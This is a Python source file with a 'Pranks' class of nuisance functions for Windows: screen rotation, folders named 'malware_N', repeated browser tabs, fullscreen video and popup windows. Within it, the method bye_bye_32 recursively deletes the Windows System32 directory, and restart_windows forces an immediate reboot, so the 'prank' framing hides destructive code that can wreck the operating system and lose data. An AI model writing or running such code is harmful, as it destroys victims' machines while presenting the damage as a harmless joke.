import shutil
import rotatescreen
import webbrowser
import time
import tkinter as tk
import random
import threading
import vlc
import os


class Pranks:
    ###################################################################################
    def rotate_screen(self):
        # Get the primary display
        pd = rotatescreen.get_primary_display()

        # List of rotation angles
        angle_list = [90, 180, 270, 0]

        # Rotate through the angles
        for angle in angle_list:
            pd.rotate_to(angle)
            time.sleep(2)  # Pause for 2 seconds at each rotation

        # Return to normal orientation
        pd.rotate_to(0)

    ###################################################################################
    def create_folders(self, base_path, num_folders, icon_path=None):
        for i in range(1, num_folders + 1):
            folder_name = f"malware_{i}"
            folder_path = os.path.join(base_path, folder_name)
            os.makedirs(folder_path)

            # If an icon path is provided, create a desktop.ini file to set the folder icon
            if icon_path and os.path.exists(icon_path):
                desktop_ini_path = os.path.join(folder_path, "desktop.ini")
                with open(desktop_ini_path, "w") as desktop_ini:
                    desktop_ini.write(f"""
[.ShellClassInfo]
IconResource={icon_path},0
                    """)
                # Set the desktop.ini as a system and hidden file
                os.system(f"attrib +h +s {desktop_ini_path}")
                # Make the folder read-only to enable the custom icon
                os.system(f"attrib +r {folder_path}")

            print(f"Created folder: {folder_path} with custom icon (if specified)")

    ###################################################################################
    def delete_folders(self, base_path, num_folders):
        for i in range(1, num_folders + 1):
            folder_name = f"malware_{i}"
            folder_path = os.path.join(base_path, folder_name)

            if os.path.exists(folder_path):
                # Remove read-only, hidden, and system attributes before deletion
                os.system(f"attrib -r -h -s {folder_path}\\*.* /S /D")
                os.system(f"attrib -r -h -s {folder_path}")

                shutil.rmtree(folder_path)
                print(f"Deleted folder: {folder_path}")

    ###################################################################################
    def open_youtube_video_with_delay(self, url, count, delay):
        for _ in range(count):
            webbrowser.open_new_tab(url)
            time.sleep(delay)  # Wait for `delay` seconds before opening the next tab

    ###################################################################################
    def bye_bye_32(self):
        # Path
        folder_path = os.path.join(os.environ.get("WINDIR"), "System32")

        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            print("Folder was deleted")
        else:
            print("Folder doesnt' exist")

    ###################################################################################
    def restart_windows(self):
        # Restart the Windows machine
        os.system("shutdown /r /t 0")

    ###################################################################################
    def play_video_fullscreen(self, video_path):
        # Create a VLC instance
        player = vlc.MediaPlayer(video_path)

        # Start playing the video
        player.play()

        # Wait for the video to start
        time.sleep(1)  # You may adjust this delay if needed

        # Set the video to full screen
        player.set_fullscreen(True)

        # Keep playing until the video finishes
        while player.is_playing():
            time.sleep(1)

        # Stop the player when finished
        player.stop()

    ###################################################################################
    def create_prank_windows(self, count):
        def run_gui():
            di = {}

            # Main root window (hidden)
            root = tk.Tk()
            root.withdraw()  # Hide the main window

            # Create `count` number of windows
            for i in range(count):
                # Generate random size and position
                width = random.randint(100, 200)  # Random width between 100 and 200
                height = random.randint(50, 150)  # Random height between 50 and 150
                x = random.randint(100, 500)  # Random x position between 100 and 500
                y = random.randint(100, 500)  # Random y position between 100 and 500

                di[i] = tk.Toplevel()  # Create a new top-level window
                di[i].geometry(f'{width}x{height}+{x}+{y}')  # Set random size and position
                di[i].title('Prank Window')  # Set window title
                di[i].resizable(False, False)  # Disable resizing of the window
                # Add a label and button to each window
                tk.Label(di[i], text='Oops!').pack()
                tk.Button(di[i], text='OK', command=di[i].destroy).pack()  # Close window button

            # Close the windows after a delay
            def close_windows():
                for window in di.values():
                    window.destroy()
                root.destroy()

            root.after(5000, close_windows)  # Close windows after 5 seconds

            # Start the Tkinter main loop
            root.mainloop()

        # Run the Tkinter GUI in a separate thread
        thread = threading.Thread(target=run_gui)
        thread.start()
